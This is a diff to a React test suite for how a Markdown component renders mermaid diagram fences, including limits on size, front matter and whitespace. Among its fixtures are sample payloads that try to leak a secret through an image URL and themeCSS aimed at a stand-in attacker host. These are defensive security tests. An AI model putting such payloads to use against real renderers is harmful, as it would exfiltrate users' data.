@@ -390,8 +390,6 @@ describe("```mermaid fences", () => {
       'flowchart TD\n  A@{ img: "https://attacker.invalid/p.png?leak=SECRET" }',
       `%%{init: {"themeCSS": ".node rect { fill: url(https://attacker.invalid/p.png) }"}}%%\n${FLOW}`,
       "flowchart LR\n  A[getSignedUrl(x)] --> B[S3]",
-      // Front matter that never closes, near the size limit: nothing on the page reads it before mermaid does.
-      `---\n${"title: x\n".repeat(5000)}flowchart LR\n  A --> B`,
     ];
     const el = render(<Markdown source={sources.map(fence).join("\n\n")} />).container;
     await settle(sources.length * 3);
@@ -399,12 +397,28 @@ describe("```mermaid fences", () => {
     expect(el.querySelectorAll(".code-card__preview img")).toHaveLength(sources.length);
   });
 
-  test("a diagram longer than mermaid draws stays code", async () => {
-    const long = `flowchart LR\n  A[${"x".repeat(50_000)}] --> B`;
-    const el = render(<Markdown source={fence(long)} />).container;
+  test("one longer than mermaid draws, with front matter it refuses or a longer run of whitespace stays code", async () => {
+    const sources = [
+      `flowchart LR\n  A[${"x".repeat(50_000)}] --> B`,
+      // Front matter that never closes.
+      `---\n${"title: x\n".repeat(5000)}flowchart LR\n  A --> B`,
+      `flowchart LR\n${"\n".repeat(1001)}  A --> B`,
+    ];
+    const el = render(<Markdown source={sources.map(fence).join("\n\n")} />).container;
     await settle();
     expect(asked).toEqual([]);
-    expect(el.querySelector(".code-card__code")).not.toBeNull();
+    expect(Array.from(el.querySelectorAll(".code-card__code"), (code) => code.textContent)).toEqual(sources);
+  });
+
+  test("one mermaid can't draw is sent once: shown again, it stays code without asking again", async () => {
+    const bad = "sequenceDiagram\n  Ana-->>";
+    const first = render(<MessageBody body={fence(bad)} />);
+    await settle();
+    first.unmount();
+    const el = render(<MessageBody body={fence(bad)} />).container;
+    await settle();
+    expect(el.querySelector(".code-card__code")?.textContent).toBe(bad);
+    expect(asked).toEqual([bad]);
   });
 
   test("a page with no mermaid fence never loads mermaid", async () => {
